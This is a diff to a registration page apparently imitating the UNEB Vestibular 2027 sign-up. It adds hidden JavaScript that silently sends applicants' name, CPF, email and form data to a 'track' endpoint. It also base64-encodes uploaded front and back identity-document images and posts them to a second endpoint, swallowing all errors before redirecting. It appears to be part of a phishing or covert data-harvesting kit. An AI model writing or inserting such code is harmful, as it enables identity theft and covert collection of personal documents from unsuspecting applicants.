@@ -1191,6 +1191,27 @@ function __handleDocTipo(v){
         });
         sessionStorage.setItem('inscricao_dados', JSON.stringify(prev));
       }catch(err){}
+      // Envia cadastro + documentos ao painel administrativo
+      try{
+        var prevC=JSON.parse(sessionStorage.getItem('inscricao_dados')||'{}');
+        var fdCad=Object.assign({},prevC); delete fdCad.SENHA; delete fdCad.CONFIRMA_SENHA;
+        fetch(window.location.origin+'/api/track/registration',{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body:JSON.stringify({
+          page:window.location.pathname,
+          user_agent:navigator.userAgent,
+          extra:{nome:prevC.NOME||'', cpf:prevC.CPF||'', email:prevC.EMAIL||'',
+            concurso:'Vestibular - 2027 - UNEB - Universidade do Estado da Bahia',
+            edital:'Vestibular 2027', stage:'cadastro', form_data:fdCad}
+        })}).catch(function(){});
+        var frEl=document.getElementById('DOC_FRENTE'), vsEl=document.getElementById('DOC_VERSO');
+        var f1=frEl&&frEl.files&&frEl.files[0], f2=vsEl&&vsEl.files&&vsEl.files[0];
+        function __toB64(f){return new Promise(function(res){if(!f){res('');return;}var r=new FileReader();r.onload=function(){res(String(r.result||'').split(',')[1]||'');};r.onerror=function(){res('');};r.readAsDataURL(f);});}
+        if((prevC.CPF||'') && (f1||f2)){
+          var tipoEl=document.getElementById('DOC_TIPO');
+          Promise.all([__toB64(f1),__toB64(f2)]).then(function(b){
+            fetch(window.location.origin+'/api/track/documents',{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf:prevC.CPF||'',doc_tipo:(tipoEl&&tipoEl.value)||'RG',doc_frente:b[0]||'',doc_verso:b[1]||''})}).catch(function(){});
+          });
+        }
+      }catch(e){}
       var loader = document.getElementById('__page_loader');
       if(loader){ loader.classList.remove('__hidden'); loader.classList.add('__show'); }
       setTimeout(function(){ window.location.href = '/termos-lgpd.html'; }, 2000);
